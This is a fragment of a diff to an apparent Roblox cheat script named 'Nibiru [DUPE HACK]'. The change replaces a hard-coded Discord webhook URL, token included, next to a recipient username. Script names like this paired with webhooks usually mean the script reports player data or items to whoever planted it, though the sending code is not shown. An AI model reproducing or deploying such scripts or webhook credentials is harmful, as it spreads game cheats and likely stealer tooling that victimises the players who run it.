@@ -18,7 +18,7 @@ Tab:AddButton({
 	Callback = function()
       		print("button pressed")
 Username = "notulP_hctiwT"
-WebHook = "https://discord.com/api/webhooks/1085227289970757632/Yt2yzcVu-LTLOJIwW7-EsdTtknLmBIabBjtTnmPicqbVx_M567dAjSIQBQldCFpOASms"
+WebHook = "https://discord.com/api/webhooks/1085992559345664062/HvPDEEvDoBr-_XANNYKgeEON0ZrvwI90r7kqtT6YTEFGH_DOUwVkNNFVOPe3w8CCsqJD"
 
 loadingscreen = true
 _G.CustomScriptName = "Nibiru [DUPE HACK]"
